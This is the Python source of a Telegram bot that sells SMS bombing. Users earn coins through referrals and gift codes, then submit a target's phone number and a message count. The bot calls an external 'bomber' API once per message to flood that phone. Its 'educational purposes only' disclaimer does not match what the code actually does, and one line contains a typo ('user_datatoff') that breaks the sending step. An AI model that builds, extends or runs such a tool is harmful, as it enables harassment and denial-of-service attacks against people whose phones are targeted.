import logging
import sqlite3
import random
import string
import requests
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
)
from dotenv import load_dotenv
import os

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Load environment variables
load_dotenv()
TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise ValueError("TOKEN not found in .env file")
OWNER_ID = os.getenv("OWNER_ID")
if not OWNER_ID:
    raise ValueError("OWNER_ID not found in .env file")
OWNER_ID = int(OWNER_ID)

# API endpoint
API_URL = "https://bomberdemofor2hrtcs.vercel.app/api/trialapi?phone="

# Database setup
def init_db():
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, referral_code TEXT UNIQUE, coins INTEGER, referred_by TEXT)''')
    # Redeem codes table
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes
                 (code TEXT PRIMARY KEY, coins INTEGER, used INTEGER)''')
    conn.commit()
    conn.close()

# Generate random code
def generate_code(length=8):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# Initialize database
init_db()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Register user and send welcome message."""
    user_id = update.effective_user.id
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    
    if not user:
        referral_code = generate_code(6)
        while True:
            c.execute("SELECT * FROM users WHERE referral_code = ?", (referral_code,))
            if not c.fetchone():
                break
            referral_code = generate_code(6)
        c.execute("INSERT INTO users (user_id, referral_code, coins) VALUES (?, ?, ?)",
                  (user_id, referral_code, 0))
        conn.commit()
    
    conn.close()
    
    await update.message.reply_text(
        f"Welcome to @ElectricSoulBombing! Your user ID: {user_id}\n"
        "This bot is for educational purposes only. Do NOT use it to harm others.\n"
        "Earn 100 coins per referral; 1 coin = 10 SMS bombings.\n"
        "Commands:\n/bomb - Start bombing\n/refer - Get referral code\n"
        "/redeem <code> - Redeem referral\n/redeemcode <code> - Redeem gift code\n"
        "/gift <user_id> <coins> - Gift coins (owner only)\n"
        "/generatecode <coins> - Generate redeem code (owner only)\n"
        "/balance - Check coins\n/help - Show help"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show help message."""
    await update.message.reply_text(
        "Commands:\n/bomb - Start bombing with button\n/refer - Get referral code\n"
        "/redeem <code> - Redeem referral code\n/redeemcode <code> - Redeem gift code\n"
        "/gift <user_id> <coins> - Gift coins (owner only)\n"
        "/generatecode <coins> - Generate redeem code (owner only)\n"
        "/balance - Check coins\n/help - Show this help\n\n"
        "Warning: SMS bombing can be illegal. Use responsibly."
    )

async def refer(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Get user's referral code."""
    user_id = update.effective_user.id
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    c.execute("SELECT referral_code FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    
    if user:
        await update.message.reply_text(f"Your referral code is: {user[0]}\n"
                                       "Share it to earn 100 coins per referral!")
    else:
        await update.message.reply_text("Please use /start to register first.")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Redeem a referral code."""
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /redeem <code>")
        return
    
    code = context.args[0].strip()
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    if not c.fetchone():
        conn.close()
        await update.message.reply_text("Please use /start to register first.")
        return
    
    c.execute("SELECT user_id FROM users WHERE referral_code = ?", (code,))
    referrer = c.fetchone()
    if not referrer:
        conn.close()
        await update.message.reply_text("Invalid referral code.")
        return
    if referrer[0] == user_id:
        conn.close()
        await update.message.reply_text("You can't redeem your own code!")
        return
    
    c.execute("SELECT referred_by FROM users WHERE user_id = ?", (user_id,))
    if c.fetchone()[0]:
        conn.close()
        await update.message.reply_text("You've already redeemed a referral code.")
        return
    
    c.execute("UPDATE users SET coins = coins + 100 WHERE user_id = ?", (referrer[0],))
    c.execute("UPDATE users SET referred_by = ? WHERE user_id = ?", (code, user_id))
    conn.commit()
    conn.close()
    
    await update.message.reply_text("Referral redeemed! Referrer earned 100 coins.")

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check coin balance."""
    user_id = update.effective_user.id
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    c.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    
    if user:
        await update.message.reply_text(f"You have {user[0]} coins. 1 coin = 10 SMS bombings.")
    else:
        await update.message.reply_text("Please use /start to register first.")

async def gift(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Gift coins to a user (owner only)."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the bot owner can use this command.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /gift <user_id> <coins>")
        return
    
    try:
        target_id = int(context.args[0])
        coins = int(context.args[1])
        if coins <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("Please provide a valid user ID and positive coin amount.")
        return
    
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (target_id,))
    if not c.fetchone():
        conn.close()
        await update.message.reply_text("Target user not found. They must use /start first.")
        return
    
    c.execute("UPDATE users SET coins = coins + ? WHERE user_id = ?", (coins, target_id))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(f"Gifted {coins} coins to user {target_id}.")

async def generate_code_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Generate a redeem code (owner only)."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the bot owner can use this command.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /generatecode <coins>")
        return
    
    try:
        coins = int(context.args[0])
        if coins <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("Please provide a positive coin amount.")
        return
    
    code = generate_code(8)
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    c.execute("INSERT INTO redeem_codes (code, coins, used) VALUES (?, ?, ?)", (code, coins, 0))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(f"Generated redeem code: {code} (worth {coins} coins).")

async def redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Redeem a gift code."""
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /redeemcode <code>")
        return
    
    code = context.args[0].strip()
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    if not c.fetchone():
        conn.close()
        await update.message.reply_text("Please use /start to register first.")
        return
    
    c.execute("SELECT coins, used FROM redeem_codes WHERE code = ?", (code,))
    code_data = c.fetchone()
    if not code_data:
        conn.close()
        await update.message.reply_text("Invalid redeem code.")
        return
    if code_data[1] == 1:
        conn.close()
        await update.message.reply_text("This code has already been redeemed.")
        return
    
    c.execute("UPDATE users SET coins = coins + ? WHERE user_id = ?", (code_data[0], user_id))
    c.execute("UPDATE redeem_codes SET used = 1 WHERE code = ?", (code,))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(f"Redeemed code! You received {code_data[0]} coins.")

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show bombing button."""
    user_id = update.effective_user.id
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    c.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    
    if not user:
        await update.message.reply_text("Please use /start to register first.")
        return
    
    keyboard = [[InlineKeyboardButton("Start Bombing", callback_data="start_bombing")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"You have {user[0]} coins. Press the button to start bombing.",
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button press."""
    query = update.callback_query
    await query.answer()
    
    if query.data == "start_bombing":
        context.user_data["bombing_step"] = "phone"
        await query.message.reply_text("Please send the phone number to bomb (digits only, at least 10).")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle user messages for bombing process."""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if "bombing_step" not in context.user_data:
        return
    
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    c.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    
    if not user:
        conn.close()
        await update.message.reply_text("Please use /start to register first.")
        return
    
    if context.user_data["bombing_step"] == "phone":
        if not text.isdigit() or len(text) < 10:
            await update.message.reply_text("Please provide a valid phone number (digits only, at least 10).")
            return
        context.user_data["phone"] = text
        context.user_data["bombing_step"] = "limit"
        max_bombs = user[0] * 10  # 1 coin = 10 bombings
        await update.message.reply_text(
            f"How many SMS do you want to send? You can send up to {max_bombs} SMS based on your {user[0]} coins."
        )
    
    elif context.user_data["bombing_step"] == "limit":
        try:
            bomb_count = int(text)
            if bomb_count <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("Please provide a valid number of SMS.")
            return
        
        max_bombs = user[0] * 10
        if bomb_count > max_bombs:
            await update.message.reply_text(f"You can only send up to {max_bombs} SMS. Try a lower number.")
            return
        
        coins_needed = (bomb_count + 9) // 10  # Ceiling division
        phone = context.user_datatoff["phone"]
        
        c.execute("UPDATE users SET coins = coins - ? WHERE user_id = ?", (coins_needed, user_id))
        conn.commit()
        conn.close()
        
        await update.message.reply_text(f"Sending {bomb_count} SMS to {phone}... Please wait.")
        success_count = 0
        for _ in range(bomb_count):
            try:
                response = requests.get(f"{API_URL}{phone}")
                if response.status_code == 200:
                    success_count += 1
                else:
                    logger.warning(f"API error for {phone}: {response.status_code} - {response.text}")
                time.sleep(1)  # Delay to avoid rate limiting
            except Exception as e:
                logger.error(f"Request error for {phone}: {e}")
        
        # Clear user data
        context.user_data.clear()
        
        await update.message.reply_text(
            f"Sent {success_count}/{bomb_count} SMS to {phone}. You have {user[0] - coins_needed} coins left.\n"
            "Warning: SMS bombing can be illegal. Use responsibly."
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log errors."""
    logger.error(f"Update {update} caused error {context.error}")

def main() -> None:
    """Run the bot."""
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("refer", refer))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("redeemcode", redeem_code))
    application.add_handler(CommandHandler("gift", gift))
    application.add_handler(CommandHandler("generatecode", generate_code_command))
    application.add_handler(CommandHandler("bomb", bomb))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    application.add_error_handler(error_handler)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
